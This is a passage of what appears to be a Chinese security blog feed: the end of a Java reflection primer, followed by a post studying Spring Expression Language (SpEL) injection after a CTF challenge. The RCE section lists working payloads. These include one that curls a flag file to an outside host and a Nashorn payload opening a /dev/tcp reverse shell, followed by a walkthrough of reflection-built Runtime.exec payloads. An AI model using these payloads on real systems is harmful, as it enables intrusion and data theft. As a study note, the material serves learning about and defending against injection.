class="line"></span><br><span class="line"><span class="comment">/*输出</span></span><br><span class="line"><span class="comment">peri0d</span></span><br><span class="line"><span class="comment">class java.lang.String</span></span><br><span class="line"><span class="comment">java.lang.String</span></span><br><span class="line"><span class="comment">class Person</span></span><br><span class="line"><span class="comment">Person</span></span><br><span class="line"><span class="comment">hell Person</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></li></ul><h1 id="反射实现"><a href="#反射实现" class="headerlink" title="反射实现"></a>反射实现</h1><ul><li><p>实例化对象的 <code>getClass()</code> 方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">String s = <span class="string">"peri0d"</span>;</span><br><span class="line">print(s);<span class="comment">// peri0d</span></span><br><span class="line">print(s.getClass()); <span class="comment">// class java.lang.String</span></span><br><span class="line">print(s.getClass().getName());<span class="comment">// java.lang.String</span></span><br></pre></td></tr></table></figure></li><li><p><code>forName()</code> 方法调用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;&#125;</span><br><span class="line">Class c = Class.forName(<span class="string">"Person"</span>);  <span class="comment">// 反射 Person 类</span></span><br><span class="line">Object obj = c.newInstance();   <span class="comment">//  反射 Person 类的实例化对象</span></span><br></pre></td></tr></table></figure></li><li><p><code>.class</code> 获取</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Class k = Person.class;</span><br><span class="line">print(k.getName());    <span class="comment">// Person</span></span><br></pre></td></tr></table></figure></li></ul><h1 id="反射属性"><a href="#反射属性" class="headerlink" title="反射属性"></a>反射属性</h1><ul><li><code>getField(String name)</code> : 获得某个公有属性</li><li><code>getFields()</code> : 获得所有公有属性</li><li><code>getDeclaredField(String name)</code>:  获得某个属性</li><li><code>getDeclaredFields()</code>:  获得所有属性</li><li><code>get(Object obj)</code> : 获取 <code>obj</code> 中的属性值</li><li><code>set(Object obj, Object value)</code> : 设置 <code>obj</code> 中对应的属性值</li></ul><h1 id="反射方法"><a href="#反射方法" class="headerlink" title="反射方法"></a>反射方法</h1><ul><li><code>getMethod(String name, Class parameterTypes)</code> : 获得该类某个公有方法</li><li><code>getMethods()</code> : 获得该类所有公有方法</li><li><code>getDeclaredMethod(String name, Class parameterTypes)</code> : 获得该类某个方法</li><li><code>getDeclaredMethods()</code> : 获得该类所有方法</li><li><code>invoke(Object obj, Object args)</code> : 传递 object 对象及调用方法的参数</li></ul><h1 id="反射构造器"><a href="#反射构造器" class="headerlink" title="反射构造器"></a>反射构造器</h1><ul><li><code>getConstructor(Class parameterTypes)</code> : 获得该类中与参数类型匹配的公有构造方法</li><li><code>getConstructors()</code> : 获得该类的所有公有构造方法</li><li><code>getDeclaredConstructor(Class parameterTypes)</code> : 获得该类中与参数类型匹配的构造方法</li><li><code>getDeclaredConstructors()</code> : 获得该类所有构造方法</li><li><code>newInstance(Object initargs)</code> : 根据传递的参数创建类的对象</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;关于 Java 反射的一些基础知识，有待补充&lt;/p&gt;
    
    </summary>
    
      <category term="Java" scheme="http://yoursite.com/categories/Java/"/>
    
    
      <category term="Java" scheme="http://yoursite.com/tags/Java/"/>
    
      <category term="反射" scheme="http://yoursite.com/tags/%E5%8F%8D%E5%B0%84/"/>
    
  </entry>
  
  <entry>
    <title>SpEL 注入</title>
    <link href="http://yoursite.com/2019/09/10/SpEL%20%E6%B3%A8%E5%85%A5/"/>
    <id>http://yoursite.com/2019/09/10/SpEL 注入/</id>
    <published>2019-09-10T07:57:15.022Z</published>
    <updated>2019-09-10T07:55:12.769Z</updated>
    
    <content type="html"><![CDATA[<p>做题目遇到了，就去查了一些这方面的资料，总结一下。</p><a id="more"></a><h1 id="SpEL-简介"><a href="#SpEL-简介" class="headerlink" title="SpEL 简介"></a>SpEL 简介</h1><ul><li><p>全称为 Spring Expression Language，即 Spring 表达式语言，和 JSP 类似但是强于 JSP</p></li><li><p>官方文档 : <a href="https://docs.spring.io/spring/docs/3.0.x/reference/expressions.html" target="_blank" rel="noopener">https://docs.spring.io/spring/docs/3.0.x/reference/expressions.html</a></p></li><li><p>语法 : </p><ul><li><code>#{...}</code> 大括号内的字符都是 SpEL 表达式，用于引入变量，属性，方法等</li><li><code>${...}</code> 大括号内的是属性名</li><li><code>T(Type)</code> 用此表示类实例，返回一个类对象，常用于引入静态常量或者静态方法</li></ul></li><li><p>用法 : </p><ul><li><p>注解在 @value 中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">FieldValueTestBean</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line">  @Value("#&#123; systemProperties['user.region'] &#125;")</span><br><span class="line">  <span class="keyword">private</span> String defaultLocale;</span><br><span class="line"><span class="comment">// systemProperties['user.region'] 是预先定义好的，赋值给 defaultLocale</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setDefaultLocale</span><span class="params">(String defaultLocale)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.defaultLocale = defaultLocale;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> String <span class="title">getDefaultLocale</span><span class="params">()</span> </span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.defaultLocale;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>bean 依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"numberGuess"</span> <span class="attr">class</span>=<span class="string">"org.spring.samples.NumberGuess"</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 相当于将一个随机数乘 100.0 赋值给 randomNumber --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"randomNumber"</span> <span class="attr">value</span>=<span class="string">"#&#123; T(java.lang.Math).random() * 100.0 &#125;"</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- other properties --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>在代码块中使用 Expression，ExpressionParser 将字符串表达式转换为 Expression 对象，因此，parseExpression 的值将在 EvaluationContext 中可用。此EvaluationContext 将是唯一可以从中访问字符串 EL 中的所有属性和变量的对象。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 解析器，解析表达式</span></span><br><span class="line">ExpressionParser parser = <span class="keyword">new</span> SpelExpressionParser();</span><br><span class="line"><span class="comment">// 计算先前定义好的表达式</span></span><br><span class="line">Expression exp = parser.parseExpression(<span class="string">"'Hello World'.concat('!')"</span>);</span><br><span class="line"><span class="comment">// 获取结果 'Hello World!'</span></span><br><span class="line">String message = (String) exp.getValue();</span><br></pre></td></tr></table></figure></li></ul></li><li><p>变量 : </p><ul><li><code>#bean_id</code> 获取容器内变量</li><li><code>#this</code> 使用当前正在计算的上下文</li><li><code>#root</code> 引用容器的 root 对象</li></ul></li></ul><h1 id="SpEL-表达式"><a href="#SpEL-表达式" class="headerlink" title="SpEL 表达式"></a>SpEL 表达式</h1><ul><li><p>文本表达式 : 支持字符串，日期，数字，布尔和 null</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ExpressionParser parser = <span class="keyword">new</span> SpelExpressionParser();</span><br><span class="line"></span><br><span class="line"><span class="comment">// evals to "Hello World"</span></span><br><span class="line">String helloWorld = (String) parser.parseExpression(<span class="string">"'Hello World'"</span>).getValue(); </span><br><span class="line"></span><br><span class="line"><span class="keyword">double</span> avogadrosNumber  = (Double) parser.parseExpression(<span class="string">"6.0221415E+23"</span>).getValue();  </span><br><span class="line"></span><br><span class="line"><span class="comment">// evals to 2147483647</span></span><br><span class="line"><span class="keyword">int</span> maxValue = (Integer) parser.parseExpression(<span class="string">"0x7FFFFFFF"</span>).getValue();  </span><br><span class="line"></span><br><span class="line"><span class="keyword">boolean</span> trueValue = (Boolean) parser.parseExpression(<span class="string">"true"</span>).getValue();</span><br><span class="line"></span><br><span class="line">Object nullValue = parser.parseExpression(<span class="string">"null"</span>).getValue();</span><br></pre></td></tr></table></figure></li><li><p>属性值( Properties )使用 <code>.</code> 来访问，数组( Arrays )和列表( Lists )使用 <code>[]</code> 来获取元素，字典( maps )使用 <code>[]</code> 和 key 访问 value</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// evals to 1856</span></span><br><span class="line"><span class="keyword">int</span> year = (Integer) parser.parseExpression(<span class="string">"Birthdate.Year + 1900"</span>).getValue(context); </span><br><span class="line"></span><br><span class="line"><span class="comment">// Inventions Array</span></span><br><span class="line">StandardEvaluationContext teslaContext = <span class="keyword">new</span> StandardEvaluationContext(tesla);</span><br><span class="line"><span class="comment">// evaluates to "Induction motor"</span></span><br><span class="line">String invention = parser.parseExpression(<span class="string">"inventions[3]"</span>).getValue(teslaContext, String.class); </span><br><span class="line"></span><br><span class="line"><span class="comment">// Members List</span></span><br><span class="line">StandardEvaluationContext societyContext = <span class="keyword">new</span> StandardEvaluationContext(ieee);</span><br><span class="line"><span class="comment">// evaluates to "Nikola Tesla"</span></span><br><span class="line">String name = parser.parseExpression(<span class="string">"Members[0].Name"</span>).getValue(societyContext, String.class);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Officer's Dictionary</span></span><br><span class="line">Inventor pupin = parser.parseExpression(<span class="string">"Officers['president']"</span>).getValue(societyContext, Inventor.class);</span><br><span class="line"><span class="comment">// evaluates to "Idvor"</span></span><br><span class="line">String city = parser.parseExpression(<span class="string">"Officers['president'].PlaceOfBirth.City"</span>).getValue(societyContext, String.class);</span><br><span class="line"><span class="comment">// setting values</span></span><br><span class="line">parser.parseExpression(<span class="string">"Officers['advisors'][0].PlaceOfBirth.Country"</span>).setValue(societyContext, <span class="string">"Croatia"</span>);</span><br></pre></td></tr></table></figure></li><li><p>列表( Lists )可以在表达式中直接使用 <code>{}</code> 表达</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// evaluates to a Java list containing the four numbers</span></span><br><span class="line">List numbers = (List) parser.parseExpression(<span class="string">"&#123;1,2,3,4&#125;"</span>).getValue(context); </span><br><span class="line"></span><br><span class="line">List listOfLists = (List) parser.parseExpression(<span class="string">"&#123;&#123;'a','b'&#125;,&#123;'x','y'&#125;&#125;"</span>).getValue(context);</span><br></pre></td></tr></table></figure></li><li><p>数组可以在表达式中直接使用 Java 语法构建，但是多维数组不能手动初始化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span>[] numbers1 = (<span class="keyword">int</span>[]) parser.parseExpression(<span class="string">"new int[4]"</span>).getValue(context); </span><br><span class="line"></span><br><span class="line"><span class="comment">// Array with initializer</span></span><br><span class="line"><span class="keyword">int</span>[] numbers2 = (<span class="keyword">int</span>[]) parser.parseExpression(<span class="string">"new int[]&#123;1,2,3&#125;"</span>).getValue(context); </span><br><span class="line"></span><br><span class="line"><span class="comment">// Multi dimensional array</span></span><br><span class="line"><span class="keyword">int</span>[][] numbers3 = (<span class="keyword">int</span>[][]) parser.parseExpression(<span class="string">"new int[4][5]"</span>).getValue(context);</span><br></pre></td></tr></table></figure></li><li><p>Java 函数可以直接在表达式中使用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// string literal, evaluates to "bc"</span></span><br><span class="line">String c = parser.parseExpression(<span class="string">"'abc'.substring(2, 3)"</span>).getValue(String.class);</span><br><span class="line"></span><br><span class="line"><span class="comment">// evaluates to true</span></span><br><span class="line"><span class="keyword">boolean</span> isMember = parser.parseExpression(<span class="string">"isMember('MihajloPupin')"</span>).getValue(societyContext, Boolean.class);</span><br></pre></td></tr></table></figure></li><li><p>可以使用关系运算，逻辑运算和数学运算</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;, &gt;, &lt;=, &gt;=, ==, !=, /, %, !</span><br><span class="line">AND, OR, NOT</span><br><span class="line">+, -, *, /, %, ^</span><br></pre></td></tr></table></figure></li><li><p>赋值可以通过赋值运算符来完成，也可以在 setValue 函数中完成，也可以在 getValue 的调用中完成</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Inventor inventor = <span class="keyword">new</span> Inventor();</span><br><span class="line">StandardEvaluationContext inventorContext = <span class="keyword">new</span> StandardEvaluationContext(inventor);</span><br><span class="line"></span><br><span class="line">parser.parseExpression(<span class="string">"Name"</span>).setValue(inventorContext, <span class="string">"Alexander Seovic2"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// alternatively( 或者 )</span></span><br><span class="line">String aleks = parser.parseExpression(<span class="string">"Name = 'AlexandarSeovic'"</span>).getValue(inventorContext, String.class);</span><br></pre></td></tr></table></figure></li><li><p><code>T(Type)</code> 可以指定 <code>java.lang.class</code> 的实例，但是对于其他实例，要完全限定</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Class dateClass = parser.parseExpression(<span class="string">"T(java.util.Date)"</span>).getValue(Class.class);</span><br><span class="line"></span><br><span class="line">Class stringClass = parser.parseExpression(<span class="string">"T(String)"</span>).getValue(Class.class);</span><br><span class="line"></span><br><span class="line"><span class="keyword">boolean</span> trueValue = parser.parseExpression(<span class="string">"T(java.math.RoundingMode).CEILING &lt; T(java.math.RoundingMode).FLOOR"</span>).getValue(Boolean.class);</span><br></pre></td></tr></table></figure></li><li><p>可以使用 <code>new</code> 调用构造函数，但是除了基元类型和字符串（其中可以使用int、float等）之外，所有的类都应该使用完全限定的类名</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Inventor einstein = p.parseExpression(<span class="string">"new org.spring.samples.spel.inventor.Inventor('Albert Einstein', 'German')"</span>).getValue(Inventor.class);</span><br><span class="line"></span><br><span class="line"><span class="comment">//create new inventor instance within add method of List</span></span><br><span class="line">p.parseExpression(<span class="string">"Members.add(new org.spring.samples.spel.inventor.Inventor('Albert Einstein', 'German'))"</span>).getValue(societyContext);</span><br></pre></td></tr></table></figure></li><li><p>变量可以使用 <code>#变量名</code> 来进行引用，这些变量是在 <code>StandardEvaluationContext</code> 中使用 <code>setVariable</code> 赋值的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Inventor tesla = <span class="keyword">new</span> Inventor(<span class="string">"Nikola Tesla"</span>, <span class="string">"Serbian"</span>);</span><br><span class="line">StandardEvaluationContext context = <span class="keyword">new</span> StandardEvaluationContext(tesla);</span><br><span class="line">context.setVariable(<span class="string">"newName"</span>, <span class="string">"Mike Tesla"</span>);</span><br><span class="line"><span class="comment">// 首字母不区分大小写</span></span><br><span class="line">parser.parseExpression(<span class="string">"Name = #newName"</span>).getValue(context);</span><br><span class="line"></span><br><span class="line">System.out.println(tesla.getName()) <span class="comment">// "Mike Tesla"</span></span><br></pre></td></tr></table></figure></li><li><p>使用 <code>#root</code> 引用根对象，使用 <code>#this</code> 引用当前上下文对象。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// create an array of integers</span></span><br><span class="line">List&lt;Integer&gt; primes = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">primes.addAll(Arrays.asList(<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">17</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// create parser and set variable 'primes' as the array of integers</span></span><br><span class="line">ExpressionParser parser = <span class="keyword">new</span> SpelExpressionParser();</span><br><span class="line">StandardEvaluationContext context = <span class="keyword">new</span> StandardEvaluationContext();</span><br><span class="line">context.setVariable(<span class="string">"primes"</span>,primes);</span><br><span class="line"></span><br><span class="line"><span class="comment">// all prime numbers &gt; 10 from the list (using selection ?&#123;...&#125;)</span></span><br><span class="line"><span class="comment">// evaluates to [11, 13, 17]</span></span><br><span class="line">List&lt;Integer&gt; primesGreaterThanTen = (List&lt;Integer&gt;) parser.parseExpression(<span class="string">"#primes.?[#this&gt;10]"</span>).getValue(context);</span><br></pre></td></tr></table></figure></li><li><p>通过使用 <code>StandardEvaluationContext</code> 中的 <code>registerFunction(String name, Method m)</code> 函数来自定义函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">StringUtils</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">reverseString</span><span class="params">(String input)</span> </span>&#123;</span><br><span class="line">    StringBuilder backwards = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; input.length(); i++) </span><br><span class="line">      backwards.append(input.charAt(input.length() - <span class="number">1</span> - i));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> backwards.toString();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ExpressionParser parser = <span class="keyword">new</span> SpelExpressionParser();</span><br><span class="line">StandardEvaluationContext context = <span class="keyword">new</span> StandardEvaluationContext();</span><br><span class="line">context.registerFunction(<span class="string">"reverseString"</span>, StringUtils.class.getDeclaredMethod(<span class="string">"reverseString"</span>, <span class="keyword">new</span> Class[] &#123; String.class &#125;));</span><br><span class="line"></span><br><span class="line">String helloWorldReversed = parser.parseExpression(<span class="string">"#reverseString('hello')"</span>).getValue(context, String.class);</span><br></pre></td></tr></table></figure></li><li><p>如果已使用 Bean 解析器配置了上下文，可以使用 <code>@</code> 获取 Bean</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ExpressionParser parser = <span class="keyword">new</span> SpelExpressionParser();</span><br><span class="line">StandardEvaluationContext context = <span class="keyword">new</span> StandardEvaluationContext();</span><br><span class="line">context.setBeanResolver(<span class="keyword">new</span> MyBeanResolver());</span><br><span class="line"></span><br><span class="line"><span class="comment">// This will end up calling resolve(context,"foo") on MyBeanResolver during evaluation</span></span><br><span class="line">Object bean = parser.parseExpression(<span class="string">"@foo"</span>).getValue(context);</span><br></pre></td></tr></table></figure></li><li><p>表达式允许多个文本和解析块混合使用，常以 <code>#{}</code> 作为分界符</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String randomPhrase = parser.parseExpression(<span class="string">"random number is #&#123;T(java.lang.Math).random()&#125;"</span>, <span class="keyword">new</span> TemplateParserContext()).getValue(String.class);</span><br><span class="line"><span class="comment">// evaluates to "random number is 0.7038186818312008"</span></span><br></pre></td></tr></table></figure></li></ul><h1 id="SpEL-中的-RCE"><a href="#SpEL-中的-RCE" class="headerlink" title="SpEL 中的 RCE"></a>SpEL 中的 RCE</h1><ul><li><p>SpEL 有两种 EvaluationContext，StandardEcalutionContext 和 SimpleEvaluationContext</p></li><li><p>两种 EvaluationContext 的区别 : </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">String calc = <span class="string">"T(java.lang.Runtime).getRuntime().exec('calc.exe')"</span>;</span><br><span class="line"></span><br><span class="line">ExpressionParser parser = <span class="keyword">new</span> SpelExpressionParser();</span><br><span class="line"></span><br><span class="line">StandardEvaluationContext std_danger = <span class="keyword">new</span> StandardEvaluationContext();</span><br><span class="line">EvaluationContext simple_safe = SimpleEvaluationContext.forReadOnlyDataBinding ().build();</span><br><span class="line"></span><br><span class="line">Expression exp = parser.parseExpression(calc);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 执行命令</span></span><br><span class="line">Object value_1 = exp.getValue(std_danger);</span><br><span class="line"><span class="comment">//报错</span></span><br><span class="line">Object value_2 = exp.getValue(simple_safe);</span><br></pre></td></tr></table></figure></li><li><p>在不指定 <code>EvaluationContext</code> 时，默认采用的是 <code>StandardEvaluationContext</code>，例如 Spring Data Commons 远程代码执行漏洞_CVE-2018-1273( 1.13-1.13.10, 2.0-2.0.5 )，SpringBoot SpEL表达式注入漏洞( 1.1.0-1.1.12, 1.2.0-1.2.7, 1.3.0 )，</p></li><li><p>payload : </p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// http://rui0.cn/archives/1043</span></span><br><span class="line"></span><br><span class="line">$&#123;<span class="number">12</span>*<span class="number">12</span>&#125;</span><br><span class="line">T(java.lang.Runtime).getRuntime().exec(<span class="string">"nslookup a.com"</span>)</span><br><span class="line">T(Thread).sleep(<span class="number">10000</span>)</span><br><span class="line">#this.getClass().forName('java.lang.Runtime').getRuntime().exec('nslookup a.com')</span><br><span class="line"><span class="keyword">new</span> java.lang.ProcessBuilder(&#123;<span class="string">'nslookup a.com'</span>&#125;).start()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 利用反射构造</span></span><br><span class="line">#&#123;T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("ex"+"ec",T(String[])).invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("getRu"+"ntime").invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime")),new String[]&#123;"/bin/bash","-c","curl fg5hme.ceye.io/`cat flag_j4v4_chun|base64|tr '\n' '-'`"&#125;)&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 利用 ScriptEngineManager 构造</span></span><br><span class="line">#&#123;T(javax.script.ScriptEngineManager).newInstance().getEngineByName("nashorn").eval("s=[3];s[0]='/bin/bash';s[1]='-c';s[2]='ex"+"ec 5&lt;&gt;/dev/tcp/1.2.3.4/2333;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done';java.la"+"ng.Run"+"time.getRu"+"ntime().ex"+"ec(s);")&#125;</span><br></pre></td></tr></table></figure></li></ul><h1 id="反射构造-RCE-的分析"><a href="#反射构造-RCE-的分析" class="headerlink" title="反射构造 RCE 的分析"></a>反射构造 RCE 的分析</h1><ul><li><p>关于反射 : <a href="https://peri0d.xyz/2019/07/23/Java%20%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/" target="_blank" rel="noopener">Java 反射机制</a></p></li><li><p>根据源码，不难看出，<code>getRuntime</code> 是返回一个 Runtime 的实例化对象，<code>Runtime.getRuntime</code> 就是实例化一个 Runtime 对象，接着调用 Runtime 类的 <code>exec</code> 函数</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/code_breaking/reflect_payload_1.png" alt="reflect_payload_1"></p></li><li><p>在 windows 上利用 Runtime 打开计算器的代码如下 : </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Runtime.getRuntime().exec(<span class="keyword">new</span> String[]&#123;<span class="string">"cmd"</span>,<span class="string">"/c"</span>,<span class="string">"C:\\Windows\\System32\\calc.exe"</span>&#125;);</span><br></pre></td></tr></table></figure></li></ul><ul><li><p>利用反射打开计算器的代码如下 : </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">""</span>.getClass().forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"exec"</span>,<span class="string">""</span>.getClass()).invoke(<span class="string">""</span>.getClass().forName(<span class="string">"java.lang.Runtime"</span>), <span class="keyword">new</span> String[]&#123;<span class="string">"cmd"</span>,<span class="string">"/c"</span>,<span class="string">"C:\\Windows\\System32\\calc.exe"</span>&#125;);</span><br></pre></td></tr></table></figure><ul><li><p><code>&quot;&quot;.getClass().forName(&quot;java.lang.Runtime&quot;)</code> 获取 String 类并转换为 Runtime 类</p></li><li><p><code>getMethod(&quot;exec&quot;,&quot;&quot;.getClass())</code> 获取 Runtime 类的 exec 函数，并说明 exec 函数的参数类型为 String</p></li><li><p><code>invoke(&quot;&quot;.getClass().forName(&quot;java.lang.Runtime&quot;), new String[]{&quot;cmd&quot;,&quot;/c&quot;,&quot;C:\\Windows\\System32\\calc.exe&quot;})</code> 执行 exec 函数，第一个参数为含有 exec 函数的对象，第二个参数为 exec 函数的参数</p></li></ul></li><li><p>这样虽然能够打开计算器，但是会报错，<code>&quot;&quot;.getClass().forName(&quot;java.lang.Runtime&quot;)</code> 返回的是类，而不是对象，所以要再使用 <code>getRuntime</code> 来实例化一个对象，最终 payload 如下 </p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/code_breaking/reflect_payload_2.png" alt></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">""</span>.getClass().forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"exec"</span>,<span class="string">""</span>.getClass()).invoke((<span class="string">""</span>.getClass().forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"getRuntime"</span>).invoke(<span class="string">""</span>.getClass().forName(<span class="string">"java.lang.Runtime"</span>),<span class="keyword">null</span>)), <span class="keyword">new</span> String[]&#123;<span class="string">"cmd"</span>,<span class="string">"/c"</span>,<span 